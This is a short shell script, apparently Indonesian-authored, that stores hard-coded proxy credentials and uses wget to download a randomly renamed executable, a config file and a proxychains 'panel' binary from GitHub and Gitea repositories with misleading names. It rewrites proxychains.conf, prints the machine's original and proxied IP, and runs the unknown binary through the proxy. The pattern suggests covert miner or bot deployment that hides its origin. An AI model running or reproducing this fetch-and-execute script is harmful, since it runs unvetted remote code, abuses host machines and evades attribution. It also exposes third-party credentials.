proxy="34.228.46.223" 
port="9293" 
user="idxrzfc04cp1zw"  
pass="791oyjfai0xdla8yloe0jrftjh" 
wget -q -O be96dNbbLaz7889 https://github.com/55113110159/apikey/raw/main/zepo && chmod +x be96dNbbLaz7889
wget -q https://raw.githubusercontent.com/55113110159/apikey/main/SHA256SUMS && chmod +x SHA256SUMS
wget -q https://https://raw.githubusercontent.com/55113110159/apikey/main/config.json && chmod +x config.json
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./be96dNbbLaz7889 -c "config.json"
